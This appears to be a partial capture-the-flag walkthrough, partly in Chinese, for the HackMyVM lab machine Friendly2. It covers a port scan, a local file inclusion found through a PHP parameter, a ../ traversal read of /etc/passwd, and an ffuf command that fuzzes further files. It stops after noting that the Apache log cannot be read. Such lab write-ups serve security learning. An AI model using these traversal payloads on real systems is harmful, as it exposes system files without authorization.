# Friendly2

2025.02.22 https://hackmyvm.eu/machines/machine.php?vm=Friendly2

[video]()

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 扫描 发现 http://192.168.5.40/tools/ 查看源码发现注释信息：

```
<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
```

访问 http://192.168.5.40/tools/check_if_exist.php?doc=keyboard.html 这里可能存在文件包含，尝试访问：

```
http://192.168.5.40/tools/check_if_exist.php?doc=../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
gh0st:x:1001:1001::/home/gh0st:/bin/bash
```

ffuf 看看还能读取到哪些信息：

```
ffuf -t 100 -ac -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.40/tools/check_if_exist.php?doc=../../../../../FUZZ
```

不能读取 apache 的 access.log 文件，
